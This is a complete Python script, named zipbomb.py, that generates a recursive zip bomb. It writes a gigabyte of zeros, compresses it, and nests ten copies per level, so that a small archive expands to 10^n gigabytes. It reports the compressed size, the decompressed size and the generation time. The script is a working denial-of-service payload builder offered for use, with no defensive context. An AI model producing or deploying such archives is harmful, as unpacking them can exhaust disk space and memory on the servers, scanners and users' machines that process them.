import zlib
import zipfile
import shutil
import os
import sys
import time


def get_file_size(filename):
    st = os.stat(filename)
    return st.st_size


def generate_dummy_file(filename,
                        size):
    with open(filename, 'w') as dummy:
        for i in range(1024):
            dummy.write((size * 1024 * 1024) * '0')


def get_filename_without_extension(name):
    try:
        return name[:name.rfind('.')]
    except:
        return name


def get_extension(name: str) -> str:
    try:
        return name[name.rfind('.') + 1:]
    except IndexError:
        return '.txt'


def compress_file(infile,
                  outfile,
                  compression_method=zipfile.ZIP_DEFLATED):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64=True)
    zf.write(infile, compress_type=compression_method)
    zf.close()


def make_copies_and_compress(infile,
                             outfile,
                             n_copies,
                             compression_method=zipfile.ZIP_DEFLATED):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64=True)
    for i in range(n_copies):
        f_name = f'{get_filename_without_extension(infile)}-{i:d}.{get_extension(infile)}'
        shutil.copy(infile, f_name)
        zf.write(f_name, compress_type=compression_method)
        os.remove(f_name)
    zf.close()


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Usage:\n')
        print(' zipbomb.py n_levels out_zip_file')
        exit()
    n_levels = int(sys.argv[1])
    out_zip_file = sys.argv[2]
    dummy_name = 'dummy.txt'
    start_time = time.time()
    generate_dummy_file(dummy_name, 1)
    level_1_zip = '1.zip'
    compress_file(dummy_name,
                  level_1_zip,
                  zipfile.ZIP_DEFLATED)
    os.remove(dummy_name)
    decompressed_size = 1
    for i in range(1, n_levels + 1):
        make_copies_and_compress(f'{i:d}.zip',
                                 f'{i + 1:d}.zip',
                                 10,
                                 zipfile.ZIP_DEFLATED)
        decompressed_size *= 10
        os.remove(f'{i:d}.zip')
    if os.path.isfile(out_zip_file):
        os.remove(out_zip_file)
    os.rename(f'{n_levels + 1:d}.zip', out_zip_file)
    end_time = time.time()
    print(f'Compressed File Size: {get_file_size(out_zip_file) / 1024.0:.2f} KB')
    print(f'Size After Decompression: {decompressed_size:d} GB')
    print(f'Generation Time: {end_time - start_time:.2f}s')
